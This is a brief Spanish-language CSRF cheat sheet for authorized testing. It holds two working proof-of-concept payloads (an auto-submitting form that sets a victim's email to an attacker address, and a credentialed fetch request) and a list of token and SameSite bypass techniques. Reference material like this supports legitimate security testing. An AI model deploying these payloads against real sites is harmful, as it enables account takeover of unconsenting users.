# Cheatsheet · CSRF

Explicación en `../../01-web/csrf/csrf.md`. **Solo sobre objetivos autorizados.**

## PoC (formulario auto-enviado)

```html
<form action="https://sitio/cambiar-email" method="POST">
  <input type="hidden" name="email" value="atacante@evil.com">
</form>
<script>document.forms[0].submit()</script>
```

## PoC con fetch (si acepta simple request)

```html
<script>
fetch('https://sitio/api/accion', {method:'POST', credentials:'include',
  headers:{'Content-Type':'text/plain'}, body:'x=1'});
</script>
```

## Bypass frecuentes

```
- Quitar el parámetro/cabecera de token  -> ¿sigue funcionando?
- Usar el token de OTRA sesión           -> ¿lo valida contra la sesión?
- Cambiar POST -> GET
- Vaciar el valor del token (token=)
- Content-Type text/plain para evitar preflight
- SameSite: probar navegación top-level (GET) si es Lax
```

## Notas

- Solo aplica a acciones que cambian estado y dependen de cookies.
- Si hay token robusto por petición y SameSite → normalmente no explotable.
